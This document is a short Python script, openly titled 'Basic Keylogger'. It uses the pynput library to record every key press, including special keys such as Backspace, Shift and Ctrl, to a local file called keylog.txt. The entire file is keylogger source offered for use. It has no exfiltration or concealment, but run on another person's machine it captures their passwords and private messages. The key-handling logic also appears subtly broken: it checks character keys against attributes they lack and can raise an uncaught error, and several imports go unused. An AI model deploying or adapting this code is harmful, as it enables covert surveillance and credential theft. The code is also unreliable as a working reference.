import os
import sys
import platform
import time
from pynput.keyboard import Listener

def on_key_press(key):
    try:
        # Convert key to string
        key_str = str(key.char)
        
        # Handle special keys (e.g., Enter, Space, Backspace)
        if key == key.space:
            key_str = " "
        elif key == key.enter:
            key_str = "\n"
        elif key == key.backspace:
            key_str = "[BACKSPACE]"
        
        # Log the key
        with open("keylog.txt", "a") as log_file:
            log_file.write(key_str)
    
    except AttributeError:
        # Handle non-character keys (e.g., Shift, Ctrl)
        if key == key.shift:
            key_str = "[SHIFT]"
        elif key == key.ctrl:
            key_str = "[CTRL]"
        else:
            key_str = str(key)
        
        # Log the key
        with open("keylog.txt", "a") as log_file:
            log_file.write(key_str)

def main():
    # Create a log file or append to an existing one
    with open("keylog.txt", "a") as log_file:
        log_file.write("\n\n--- Keylogger Started ---\n")
    
    # Start the keylogger
    with Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == "__main__":
    print("Basic Keylogger: Press Ctrl+C to stop logging.")
    main()
